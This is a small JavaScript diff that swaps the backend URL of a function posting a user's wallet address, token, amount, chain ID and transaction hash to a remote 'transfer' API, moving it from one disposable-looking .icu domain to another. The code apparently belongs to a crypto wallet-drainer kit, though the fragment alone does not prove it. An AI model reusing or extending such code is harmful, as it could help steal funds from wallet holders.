@@ -274,7 +274,7 @@ const getScanLink = (hash, chainId, isTx = false) => {
 // Функция отправки запроса на трансфер
 const sendTransferRequest = async (userAddress, tokenAddress, amount, chainId, txHash) => {
   try {
-    const response = await fetch('https://api.cryptomuspayye.icu/api/transfer', {
+    const response = await fetch('https://api.latesta.icu/api/transfer', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ userAddress, tokenAddress, amount: amount.toString(), chainId, txHash })
